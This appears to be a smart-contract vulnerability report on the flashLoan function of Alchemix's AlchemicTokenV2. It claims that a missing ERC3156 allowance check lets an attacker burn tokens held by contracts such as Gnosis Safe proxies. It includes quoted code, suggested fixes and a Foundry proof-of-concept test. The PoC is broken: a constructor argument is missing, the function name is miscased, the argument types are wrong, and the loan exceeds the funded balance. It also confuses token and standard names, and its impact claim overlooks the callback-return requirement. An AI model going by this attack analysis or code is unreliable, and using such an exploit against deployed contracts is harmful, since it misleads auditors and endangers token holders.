# `AlchemicTokenV2.flashloan()` and `AlchemicTokenV2Base.flashloan()` does not spend allowance given by borrower.

## Bug Description
Accroding to the ERC3156 standard, after flashloan, flash borrower should approve `amount + fee` token to lender and lender should spend allowance before burning, but unfortunately such logic is missing.

https://github.com/alchemix-finance/v2-foundry/blob/master/src/AlchemicTokenV2.sol#L210-L235
```
  function flashLoan(
    IERC3156FlashBorrower receiver,
    address token,
    uint256 amount,
    bytes calldata data
  ) external override nonReentrant returns (bool) {
    if (token != address(this)) {
      revert IllegalArgument();
    }

    if (amount > maxFlashLoan(token)) {
      revert IllegalArgument();
    }

    uint256 fee = flashFee(token, amount);

    _mint(address(receiver), amount);

    if (receiver.onFlashLoan(msg.sender, token, amount, fee, data) != CALLBACK_SUCCESS) {
      revert IllegalState();
    }

    _burn(address(receiver), amount + fee); // Will throw error if not enough to burn

    return true;
  }
```

Victim contract could be GnosisSafeProxy multi-sig wallet which has ALCX balance.

```
contract GnosisSafeProxy {
    // singleton always needs to be first declared variable, to ensure that it is at the same location in the contracts to which calls are delegated.
    // To reduce deployment costs this variable is internal and needs to be retrieved via `getStorageAt`
    address internal singleton;
    /// @dev Constructor function sets address of singleton contract.
    /// @param _singleton Singleton address.
    constructor(address _singleton) {
        require(_singleton != address(0), "Invalid singleton address provided");
        singleton = _singleton;
    }
    /// @dev Fallback function forwards all transactions and returns all received return data.
    fallback() external payable {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            let _singleton := and(sload(0), 0xffffffffffffffffffffffffffffffffffffffff)
            // 0xa619486e == keccak("masterCopy()"). The value is right padded to 32-bytes with 0s
            if eq(calldataload(0), 0xa619486e00000000000000000000000000000000000000000000000000000000) {
                mstore(0, _singleton)
                return(0, 0x20)
            }
            calldatacopy(0, 0, calldatasize())
            let success := delegatecall(gas(), _singleton, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            if eq(success, 0) {
                revert(0, returndatasize())
            }
            return(0, returndatasize())
        }
    }
}
```

## Impact
Any contract with fallback() and ACLX balance, for example Safe multi-sig wallet might lose its balance by malicious hacker.

## Recommendation
1) Should follow ERC3165 standard by spending allowance.

```
  function flashLoan(
    IERC3156FlashBorrower receiver,
    address token,
    uint256 amount,
    bytes calldata data
  ) external override nonReentrant returns (bool) {
    ...

    if (receiver.onFlashLoan(msg.sender, token, amount, fee, data) != CALLBACK_SUCCESS) {
      revert IllegalState();
    }

+   uint256 currentAllowance = allowance(address(receiver), address(this));
+   require(currentAllowance >= amount + fee, "ERC20FlashMint: allowance does not allow refund");
+   _approve(address(receiver), address(this), currentAllowance - amount - fee);

    _burn(address(receiver), amount + fee); // Will throw error if not enough to burn

    return true;
  }
```

2) Replace `receiver` parameter with `msg.sender`

```
    IERC3156FlashBorrower receiver,
    address token,
    uint256 amount,
    bytes calldata data
  ) external override nonReentrant returns (bool) {
+     IERC3156FlashBorrower receiver = IERC3156FlashBorrower(msg.sender);
  }
```

## Proof of Concept
```
contract GnosisSafeProxy {
    // singleton always needs to be first declared variable, to ensure that it is at the same location in the contracts to which calls are delegated.
    // To reduce deployment costs this variable is internal and needs to be retrieved via `getStorageAt`
    address internal singleton;
    /// @dev Constructor function sets address of singleton contract.
    /// @param _singleton Singleton address.
    constructor(address _singleton) {
        require(_singleton != address(0), "Invalid singleton address provided");
        singleton = _singleton;
    }
    /// @dev Fallback function forwards all transactions and returns all received return data.
    fallback() external payable {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            let _singleton := and(sload(0), 0xffffffffffffffffffffffffffffffffffffffff)
            // 0xa619486e == keccak("masterCopy()"). The value is right padded to 32-bytes with 0s
            if eq(calldataload(0), 0xa619486e00000000000000000000000000000000000000000000000000000000) {
                mstore(0, _singleton)
                return(0, 0x20)
            }
            calldatacopy(0, 0, calldatasize())
            let success := delegatecall(gas(), _singleton, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            if eq(success, 0) {
                revert(0, returndatasize())
            }
            return(0, returndatasize())
        }
    }
}

contract ContractTest is Test {
  function setUp() public {
    vm.createSelectFork("mainnet"); 
  }

  function testFlashloan() public {
    GnosisSafeProxy proxy = new GnosisSafeProxy();
    AlchemicTokenV2 alcx = new AlchemicTokenV2();

    deal(address(alcx), address(proxy), 1000 ether);
    alcx.flashloan(proxy, alcx, 100000 ether, bytes(""));
  }
}
